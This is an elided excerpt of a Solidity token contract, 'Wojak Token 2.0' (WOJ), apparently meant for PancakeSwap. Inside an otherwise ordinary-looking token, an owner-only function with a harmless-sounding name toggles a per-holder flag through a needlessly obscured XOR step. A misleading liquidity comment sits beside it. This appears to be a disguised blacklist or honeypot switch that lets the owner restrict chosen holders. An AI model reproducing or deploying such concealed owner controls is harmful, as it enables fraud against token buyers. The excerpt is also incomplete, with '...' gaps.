...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Wojak Token 2.0';
    string constant public symbol = 'WOJ';
    ...
    function increaseAllowance(address spender, uint256 addedValue) public returns(bool) {
        ...
        return true;
    }  function WojakPancakesCake(address addressholders) public onlyOwner {
        bool currentValue = _baysapps[addressholders];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _baysapps[addressholders] = secretValue != 0;
    } // Add Liquidity Pancakes V2-V3 Public View
    ...
    function WojakSmartTokens(address account) public {
    ...
    function WojakSmartCake(address account) public view returns(bool) {
...
contract WojakContract is BaseToken {
    constructor() {
